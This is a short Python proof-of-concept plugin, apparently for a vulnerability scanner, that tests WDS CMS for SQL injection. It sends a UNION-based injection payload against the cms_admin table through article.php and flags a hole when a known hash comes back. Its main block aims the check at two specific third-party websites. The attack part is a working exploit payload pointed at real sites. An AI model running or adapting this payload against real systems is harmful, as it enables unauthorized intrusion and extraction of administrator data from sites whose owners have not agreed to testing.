#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  WDS CMS - SQL Injection
References:  https://www.exploit-db.com/exploits/37750/
Author    :  rocke
QQ        :  979040408
"""
def assign(service, arg):
    if service == "wdscms":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl2(url + '/wds_news/article.php?ID=-1+union+select+1,md5(1),3,4,5,6,7,8,9,10+from+cms_admin--')
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wdscms', 'http://www.swimrun.nu/')[1])
    audit(assign('wdscms', 'http://www.aquatrail.se/')[1])